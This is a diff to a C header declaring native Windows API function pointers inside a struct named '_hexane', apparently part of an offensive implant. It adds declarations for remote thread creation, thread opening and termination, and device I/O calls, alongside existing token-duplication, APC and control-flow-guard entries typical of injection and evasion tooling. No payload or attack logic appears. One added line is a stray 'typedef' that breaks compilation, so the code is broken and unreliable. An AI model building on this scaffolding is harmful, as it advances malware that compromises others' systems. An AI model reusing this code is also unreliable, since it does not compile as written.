@@ -166,7 +166,12 @@ typedef NTSTATUS(NTAPI* NtOpenProcessToken_t)(HANDLE ProcessHandle, ACCESS_MASK 
 typedef NTSTATUS(NTAPI* NtOpenThreadToken_t)(HANDLE ThreadHandle, ACCESS_MASK DesiredAccess, BOOLEAN OpenAsSelf, PHANDLE TokenHandle);
 typedef NTSTATUS(NTAPI* NtDuplicateToken_t)(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN EffectiveOnly, TOKEN_TYPE Type, PHANDLE NewTokenHandle);
 typedef NTSTATUS(NTAPI* NtDuplicateObject_t)(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options);
+typedef NTSTATUS(NTAPI* NtOpenThread_t)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
+typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PUSER_THREAD_START_ROUTINE StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
+typedef NTSTATUS(NTAPI* NtTerminateThread_t)(HANDLE ThreadHandle, NTSTATUS ExitStatus);
 
+typedef NTSTATUS (NTAPI* NtDeviceIoControlFile_t)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength);
+typedef NTSTATUS (NTAPI* NtOpenFile_t)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions);
 typedef NTSTATUS(NTAPI* NtQueryInformationToken_t)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, PVOID TokenInformation, ULONG TokenInformationLength, PULONG ReturnLength);
 typedef NTSTATUS(NTAPI* NtQueryInformationProcess_t)(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
 typedef NTSTATUS(NTAPI* NtCreateUserProcess_t)(PHANDLE processHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess, ACCESS_MASK ThreadDesiredAccess, POBJECT_ATTRIBUTES ProcessObjectAttributes, POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags, PRTL_USER_PROCESS_PARAMETERS ProcessParams, PPS_CREATE_INFO CreateInfo, PPS_ATTRIBUTE_LIST ProcessAttributeList);
@@ -177,6 +182,7 @@ typedef NTSTATUS(NTAPI* RtlDestroyProcessParameters_t)(PRTL_USER_PROCESS_PARAMET
 typedef NTSTATUS (NTAPI* RtlGetVersion_t)(PRTL_OSVERSIONINFOW lpVersionInformation);
 typedef ULONG (NTAPI* RtlRandomEx_t)(PULONG Seed);
 
+typedef
 typedef BOOL (WINAPI* SetProcessValidCallTargets_t)(HANDLE hProcess, PVOID VirtualAddress, SIZE_T RegionSize, ULONG NumberOfOffsets, PCFG_CALL_TARGET_INFO OffsetInformation);
 typedef PVOID (NTAPI* RtlAddVectoredExceptionHandler_t)(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
 typedef ULONG (NTAPI* RtlRemoveVectoredExceptionHandler_t)(PVOID Handle);
@@ -439,6 +445,7 @@ struct _hexane{
 		HMODULE advapi;
 		HMODULE iphlpapi;
 		HMODULE mscoree;
+		HMODULE kernbase;
 	} modules;
 
 	struct {
@@ -508,6 +515,9 @@ struct _hexane{
 
 		RtlAddVectoredExceptionHandler_t RtlAddVectoredExceptionHandler;
 		RtlRemoveVectoredExceptionHandler_t RtlRemoveVectoredExceptionHandler;
+		NtCreateThreadEx_t NtCreateThreadEx;
+		NtOpenThread_t NtOpenThread;
+		NtTerminateThread_t NtTerminateThread;
 
 		RtlRandomEx_t RtlRandomEx;
 		NtResumeThread_t NtResumeThread;
@@ -525,6 +535,8 @@ struct _hexane{
 		RtlGetVersion_t RtlGetVersion;
 		NtQuerySystemInformation_t NtQuerySystemInformation;
         SetProcessValidCallTargets_t SetProcessValidCallTargets;
+		NtDeviceIoControlFile_t NtDeviceIoControlFile;
+		NtOpenFile_t NtOpenFile;
 
 	} nt;
 
@@ -582,6 +594,7 @@ struct _hexane{
 		__prototype(FormatMessageA);
 		__prototype(CreateRemoteThread);
 		__prototype(CreateThread);
+		__prototype(ExitThread);
 		__prototype(QueueUserAPC);
 		__prototype(GetThreadLocale);
 		__prototype(SleepEx);
